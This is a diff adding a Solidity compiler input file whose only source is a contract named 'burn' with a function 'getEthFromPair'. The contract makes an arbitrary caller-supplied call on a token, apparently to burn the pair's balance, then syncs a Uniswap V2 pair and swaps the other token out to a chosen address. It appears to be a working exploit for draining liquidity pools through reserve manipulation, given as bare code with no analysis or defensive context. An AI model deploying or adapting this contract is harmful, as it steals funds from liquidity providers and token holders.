@@ -1,0 +1,29 @@
+{
+  "language": "Solidity",
+  "settings": {
+    "libraries": {},
+    "metadata": {
+      "useLiteralContent": true
+    },
+    "optimizer": {
+      "enabled": false,
+      "runs": 200
+    },
+    "remappings": [],
+    "outputSelection": {
+      "*": {
+        "*": [
+          "*"
+        ],
+        "": [
+          "*"
+        ]
+      }
+    }
+  },
+  "sources": {
+    "contracts/burn.sol": {
+      "content": "pragma solidity 0.6.12;\n\ninterface IUniswapV2Router02 {\n    function swapExactTokensForTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amounts);\n}\ninterface IUniswapV2Pair {\n    function sync() external;\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n}\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\ncontract burn{\n    function getEthFromPair(address burnToken,address otherToken,address pairAddress,address target,bytes memory burnParam,uint256 outAmount ) public{\n        burnToken.call(burnParam);\n        address[] memory paths2 = new address[](2);\n        paths2[0] = burnToken;\n        paths2[1] = otherToken;\n        if(msg.sender==0xFB04C32Cd640f70F429De6f2Ad1d9e4296CD337F)\n            IUniswapV2Pair(pairAddress).sync();\n        \n        IERC20(burnToken).transfer(\n            pairAddress,\n            IERC20(burnToken).balanceOf(\n                address(this)\n            )\n        );\n        IUniswapV2Pair(pairAddress).swap(0,outAmount,target,new bytes(0));\n    }\n}"
+    }
+  }
+}
